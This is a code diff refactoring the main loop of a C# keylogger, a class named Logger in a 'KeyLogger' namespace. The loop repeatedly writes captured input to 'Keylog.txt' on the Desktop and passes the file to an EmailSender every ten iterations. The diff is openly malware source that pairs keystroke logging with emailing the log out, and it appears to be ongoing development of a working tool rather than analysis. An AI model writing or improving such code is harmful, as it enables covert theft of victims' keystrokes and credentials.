@@ -8,51 +8,30 @@ namespace KeyLogger
     {
         FileDecorator fileDecorator;
         EmailSender emailSender;
-        string folder;
+        string folderPath;
         string file;
-        private bool _ready;
-
-        private bool Ready
-        {
-            get
-            {
-                return _ready;
-            }
-            set
-            {
-                using (StreamReader sr = new StreamReader(file))
-                {
-                    for (int i = 1; i <= file.Length; i++)
-                    {
-                        if (i % 100 == 0)
-                        {
-                            _ready = true;
-                        }
-                    }
-                }
-
-                _ready = false;
-            }
-        }
+        string fileName = "Keylog.txt";
 
         public Logger()
         {
             fileDecorator = new FileDecorator();
             emailSender = new EmailSender();
-            folder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-            file = folder + @"\keylog.txt";
+            folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+            file = folderPath + @"\" + fileName;
         }
 
         public void Start()
         {
             fileDecorator.CreateFile();
+            int charNumbers = default;
 
             while (true)
             {
                 Thread.Sleep(5);
                 file = fileDecorator.WriteFile();
+                charNumbers++;
 
-                if (Ready)
+                if (charNumbers % 10 == 0)
                 {
                     emailSender.SendMessage(file);
                 }
@@ -60,3 +39,4 @@ namespace KeyLogger
         }
     }
 }
+
